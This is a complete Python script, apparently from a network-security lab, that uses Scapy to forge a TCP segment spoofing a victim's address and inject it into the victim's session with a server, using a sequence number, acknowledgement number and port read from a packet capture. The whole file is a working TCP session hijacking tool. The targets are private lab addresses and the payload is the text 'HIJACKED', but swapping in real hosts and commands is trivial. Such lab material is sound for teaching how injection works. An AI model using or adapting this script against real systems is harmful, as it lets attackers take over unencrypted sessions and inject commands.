#!/usr/bin/env python3
"""Inject a spoofed segment into the victim -> server TCP session.

    sudo python3 hijack.py <seq> <ack> <sport> [payload_len]

<seq>         the sequence number shown at the start of the victim segment in
              the capture, e.g. for "seq 100:106" pass 100
<payload_len> the payload length of that segment (6 for "HELLO\\n"); the
              injected segment is placed at seq + payload_len
"""

import sys

from scapy.all import IP, TCP, send

VICTIM = '172.21.0.2'
SERVER = '172.21.0.3'
DPORT = 9999
PAYLOAD = b'HIJACKED\n'


def main():
    if len(sys.argv) not in (4, 5):
        print('Usage: sudo python3 hijack.py <seq> <ack> <sport> [payload_len]')
        sys.exit(2)
    seq = int(sys.argv[1])
    ack = int(sys.argv[2])
    sport = int(sys.argv[3])
    plen = int(sys.argv[4]) if len(sys.argv) == 5 else 0
    next_seq = seq + plen
    pkt = (IP(src=VICTIM, dst=SERVER)
           / TCP(sport=sport, dport=DPORT, flags='PA', seq=next_seq, ack=ack)
           / PAYLOAD)
    send(pkt, verbose=False)
    print('Injected HIJACKED: seq=%d ack=%d sport=%d' % (next_seq, ack, sport))


if __name__ == '__main__':
    main()
